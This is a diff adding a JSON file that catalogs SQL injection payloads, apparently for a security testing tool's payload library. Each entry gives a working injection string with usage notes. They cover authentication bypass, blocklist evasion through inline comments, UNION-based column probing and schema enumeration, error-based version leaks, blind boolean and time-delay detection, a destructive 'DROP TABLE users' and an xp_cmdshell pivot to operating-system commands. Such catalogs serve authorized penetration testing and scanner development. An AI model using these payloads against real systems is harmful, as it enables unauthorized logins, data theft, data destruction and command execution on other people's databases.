@@ -1,0 +1,160 @@
+{
+  "id": "sqli",
+  "label": "SQL Injection",
+  "entries": [
+    {
+      "id": "auth-or-1-1",
+      "label": "Auth bypass — OR 1=1",
+      "payload": "' OR 1=1--",
+      "notes": "Classic tautology in a single-quoted string sink; comments out the trailing predicate.",
+      "tags": ["auth-bypass", "boolean", "comment-dash"]
+    },
+    {
+      "id": "auth-admin-comment",
+      "label": "Auth bypass — admin'--",
+      "payload": "admin'--",
+      "notes": "Authenticates as the literal user 'admin' by commenting out the password check.",
+      "tags": ["auth-bypass", "comment-dash"]
+    },
+    {
+      "id": "auth-double-quote-tautology",
+      "label": "Auth bypass — double-quoted tautology",
+      "payload": "\" OR \"\"=\"",
+      "notes": "Mirrors the OR 1=1 idea in a double-quoted column/string sink.",
+      "tags": ["auth-bypass", "boolean"]
+    },
+    {
+      "id": "comment-styles",
+      "label": "Comment-style probe (--, #, /* */)",
+      "payload": "' OR 1=1-- -",
+      "notes": "MySQL requires whitespace after '--' to be treated as a comment; trailing space + token is the safe form.",
+      "tags": ["mysql", "comment-dash"]
+    },
+    {
+      "id": "mysql-hash-comment",
+      "label": "MySQL # comment",
+      "payload": "' OR 1=1#",
+      "notes": "MySQL-only comment marker; useful when '--' is filtered.",
+      "tags": ["mysql", "comment-hash"]
+    },
+    {
+      "id": "inline-comment",
+      "label": "Inline /* */ comment",
+      "payload": "'/**/OR/**/1=1--",
+      "notes": "Splits keywords with comments to bypass token-based blocklists; works on MySQL/MSSQL/PostgreSQL.",
+      "tags": ["waf-bypass", "comment-block"]
+    },
+    {
+      "id": "union-select-null",
+      "label": "UNION SELECT NULL",
+      "payload": "' UNION SELECT NULL--",
+      "notes": "Column-count probe — increment NULLs until the query stops erroring; reveals column count.",
+      "tags": ["union", "enumeration"]
+    },
+    {
+      "id": "union-select-three",
+      "label": "UNION SELECT 1,2,3",
+      "payload": "' UNION SELECT 1,2,3--",
+      "notes": "Identifies which column reflects in the response; pivot point for data extraction.",
+      "tags": ["union", "enumeration"]
+    },
+    {
+      "id": "union-version",
+      "label": "UNION SELECT @@version",
+      "payload": "' UNION SELECT @@version,NULL,NULL--",
+      "notes": "MySQL/MSSQL DB version disclosure via UNION; column count and reflecting position must match.",
+      "tags": ["union", "mysql", "mssql", "info-disclosure"]
+    },
+    {
+      "id": "union-postgres-version",
+      "label": "UNION — PostgreSQL version()",
+      "payload": "' UNION SELECT version(),NULL,NULL--",
+      "notes": "PostgreSQL flavor of version disclosure; uses version() function instead of @@version.",
+      "tags": ["union", "postgresql", "info-disclosure"]
+    },
+    {
+      "id": "error-extractvalue",
+      "label": "Error-based — MySQL extractvalue",
+      "payload": "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
+      "notes": "Forces XPATH error that leaks the inner SELECT result; works on MySQL 5.1+.",
+      "tags": ["error-based", "mysql"]
+    },
+    {
+      "id": "error-mssql-convert",
+      "label": "Error-based — MSSQL CONVERT",
+      "payload": "' AND 1=CONVERT(int,@@version)--",
+      "notes": "Type-cast failure leaks @@version in the SQL Server error message.",
+      "tags": ["error-based", "mssql"]
+    },
+    {
+      "id": "blind-bool-true",
+      "label": "Blind boolean — true branch",
+      "payload": "' AND 1=1--",
+      "notes": "Pair with the false branch (' AND 1=2--) and diff the responses to confirm boolean-blind injection.",
+      "tags": ["blind", "boolean"]
+    },
+    {
+      "id": "blind-bool-false",
+      "label": "Blind boolean — false branch",
+      "payload": "' AND 1=2--",
+      "notes": "Companion to the true branch; expected to behave differently if the parameter is injectable.",
+      "tags": ["blind", "boolean"]
+    },
+    {
+      "id": "blind-mysql-sleep",
+      "label": "Blind time — MySQL SLEEP",
+      "payload": "' OR SLEEP(5)--",
+      "notes": "Detect injectability via response delay; tune the seconds to clear network jitter.",
+      "tags": ["blind", "time", "mysql"]
+    },
+    {
+      "id": "blind-mssql-waitfor",
+      "label": "Blind time — MSSQL WAITFOR",
+      "payload": "'; WAITFOR DELAY '0:0:5'--",
+      "notes": "MSSQL stacked-query time delay; requires the driver/sink to allow stacked statements.",
+      "tags": ["blind", "time", "mssql", "stacked"]
+    },
+    {
+      "id": "blind-postgres-pgsleep",
+      "label": "Blind time — PostgreSQL pg_sleep",
+      "payload": "'; SELECT pg_sleep(5)--",
+      "notes": "PostgreSQL time-based; pg_sleep is the canonical sleep primitive.",
+      "tags": ["blind", "time", "postgresql", "stacked"]
+    },
+    {
+      "id": "stacked-drop",
+      "label": "Stacked DROP TABLE",
+      "payload": "'; DROP TABLE users--",
+      "notes": "Demonstrates stacked-query risk where the driver allows ';'. Many drivers (PHP/MySQL, default JDBC) reject stacking.",
+      "tags": ["stacked", "destructive"]
+    },
+    {
+      "id": "schema-mysql",
+      "label": "MySQL schema enumeration",
+      "payload": "' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables--",
+      "notes": "Standard table enumeration once column count and reflecting columns are known.",
+      "tags": ["enumeration", "mysql", "schema"]
+    },
+    {
+      "id": "schema-sqlite",
+      "label": "SQLite schema enumeration",
+      "payload": "' UNION SELECT name,sql,NULL FROM sqlite_master--",
+      "notes": "SQLite stores schema in sqlite_master; equivalent of information_schema.tables.",
+      "tags": ["enumeration", "sqlite", "schema"]
+    },
+    {
+      "id": "mssql-xp-cmdshell",
+      "label": "MSSQL xp_cmdshell",
+      "payload": "'; EXEC xp_cmdshell 'whoami'--",
+      "notes": "Demonstrates SQL-to-OS pivot if xp_cmdshell is enabled and account is privileged. Often disabled by default since MSSQL 2005.",
+      "tags": ["mssql", "rce", "stacked"]
+    },
+    {
+      "id": "order-by-probe",
+      "label": "ORDER BY column probe",
+      "payload": "' ORDER BY 5--",
+      "notes": "Increment until the query errors to discover column count; precursor to UNION-based extraction.",
+      "tags": ["enumeration", "union"]
+    }
+  ]
+}
